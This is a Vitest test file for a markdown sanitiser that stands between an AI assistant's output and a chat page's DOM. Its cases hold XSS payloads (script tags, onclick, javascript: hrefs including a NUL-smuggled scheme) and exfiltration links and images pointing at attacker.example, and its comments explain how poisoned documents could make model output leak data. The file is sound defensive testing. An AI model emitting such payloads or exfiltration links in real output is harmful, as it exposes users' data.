/**
 * `renderMarkdown` is the ONLY trust boundary between model output and the DOM.
 * `ChatMessage.svelte` renders assistant messages with `{@html}`; user messages
 * go through Svelte's escaping. Until now this file had no tests at all, so a
 * future re-addition of `img`, or a widened scheme list, would have landed in
 * production silently.
 */
import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './markdown';

const authored = { untrusted: false } as const;

describe('renderMarkdown — script and tag surface', () => {
	it('drops script tags entirely', () => {
		const html = renderMarkdown('<script>alert(1)</script>hello');
		expect(html).not.toContain('<script');
		expect(html).not.toContain('alert(1)');
	});

	it('drops img — the automatic-beacon vector', () => {
		// An <img> fetches on render with no click, so a poisoned document could
		// exfiltrate through the src query string without any user action.
		const html = renderMarkdown('![x](https://attacker.example/?d=secret)');
		expect(html).not.toContain('<img');
		expect(html).not.toContain('attacker.example');
	});

	it('drops event-handler attributes', () => {
		expect(renderMarkdown('<div onclick="steal()">x</div>')).not.toContain('onclick');
	});

	it('drops javascript: hrefs in both modes', () => {
		for (const options of [undefined, authored]) {
			const html = renderMarkdown('[click](javascript:alert(1))', options);
			expect(html).not.toContain('javascript:');
		}
	});

	it('strips control characters before sanitisation', () => {
		// The historical bypass: a NUL inside the scheme reaches the sanitiser
		// looking harmless, and the browser reassembles it into javascript:.
		// Built with fromCharCode so the payload is a REAL control character —
		// a '\\u0000' escape in the source is six harmless literal characters
		// and would assert nothing.
		const nul = String.fromCharCode(0);
		const html = renderMarkdown(`[x](java${nul}script:alert(1))`, authored);
		expect(html).not.toContain('javascript:');
	});

	it('keeps tab/newline/CR, and they still cannot smuggle a scheme through', () => {
		// These three are exempt from the control-character strip because block
		// structure is made of them. The exemption is only safe if whitespace
		// inside a link destination cannot survive into an href — assert that
		// directly rather than trusting the parser to behave.
		for (const ws of ['\n', '\t', '\r']) {
			const html = renderMarkdown(`[x](java${ws}script:alert(1))`, authored);
			expect(html).not.toContain('javascript:');
			expect(html).not.toContain('href="java');
		}
	});

	it('preserves block structure — the strip must not eat newlines', () => {
		// The regression this pins: a 00–1F strip removes \n, so marked saw one
		// line and every list, heading and fence collapsed into a paragraph.
		const html = renderMarkdown('# Title\n\n- one\n- two\n\n```\ncode\n```');
		expect(html).toContain('<h1>Title</h1>');
		expect(html).toContain('<li>one</li>');
		expect(html).toContain('<pre>');
	});

	it('rejects protocol-relative URLs', () => {
		expect(renderMarkdown('[x](//evil.example/p)', authored)).not.toContain('//evil.example');
	});
});

describe('renderMarkdown — untrusted link policy (model output)', () => {
	it('defaults to untrusted, so a new caller gets the safe behaviour', () => {
		// Deny by default is the whole design: a future AI surface that forgets to
		// pass an option must not silently get the permissive policy.
		expect(renderMarkdown('[details](https://attacker.example/?d=SECRET)')).not.toContain('attacker.example');
	});

	it('removes the href but KEEPS the visible text', () => {
		const html = renderMarkdown('[click here](https://attacker.example/?d=SECRET)');
		expect(html).toContain('click here');
		expect(html).not.toContain('href');
		expect(html).not.toContain('SECRET');
	});

	it('allows a host on the allowlist', () => {
		const html = renderMarkdown('[MDN](https://developer.mozilla.org/en-US/docs/Web)');
		expect(html).toContain('href="https://developer.mozilla.org/en-US/docs/Web"');
		expect(html).toContain('rel="noopener noreferrer"');
	});

	it('matches the host exactly — no suffix trick', () => {
		// `github.com.evil.example` must not pass for `github.com`.
		expect(renderMarkdown('[x](https://github.com.evil.example/p)')).not.toContain('href');
		expect(renderMarkdown('[x](https://notgithub.com/p)')).not.toContain('href');
	});

	it('keeps relative links working — the assistant cites /docs paths', () => {
		const html = renderMarkdown('[the docs](/docs/blueprint/ai/layered-rag.md)');
		expect(html).toContain('href="/docs/blueprint/ai/layered-rag.md"');
		// Same-tab so SvelteKit client-routes it.
		expect(html).not.toContain('target="_blank"');
	});

	it('drops mailto in untrusted mode — subject/body are the same channel', () => {
		expect(renderMarkdown('[mail](mailto:a@b.example?subject=SECRET)')).not.toContain('mailto:');
	});

	it('still renders ordinary formatting', () => {
		const html = renderMarkdown('**bold** and `code`\n\n- one\n- two');
		expect(html).toContain('<strong>bold</strong>');
		expect(html).toContain('<code>code</code>');
		expect(html).toContain('<li>one</li>');
	});
});

describe('renderMarkdown — authored content opts out', () => {
	it('keeps an arbitrary external link for human-authored sources', () => {
		// Desk help and blog bodies are written by the operator, not by a model.
		const html = renderMarkdown('[somewhere](https://example.org/page)', authored);
		expect(html).toContain('href="https://example.org/page"');
		expect(html).toContain('target="_blank"');
	});

	it('keeps mailto for authored content', () => {
		expect(renderMarkdown('[mail](mailto:hello@example.org)', authored)).toContain('mailto:hello@example.org');
	});

	it('still refuses script and img even when authored', () => {
		// Opting out relaxes the LINK policy only. Everything else is unchanged.
		const html = renderMarkdown('<script>x()</script>![i](https://example.org/i.png)', authored);
		expect(html).not.toContain('<script');
		expect(html).not.toContain('<img');
	});
});
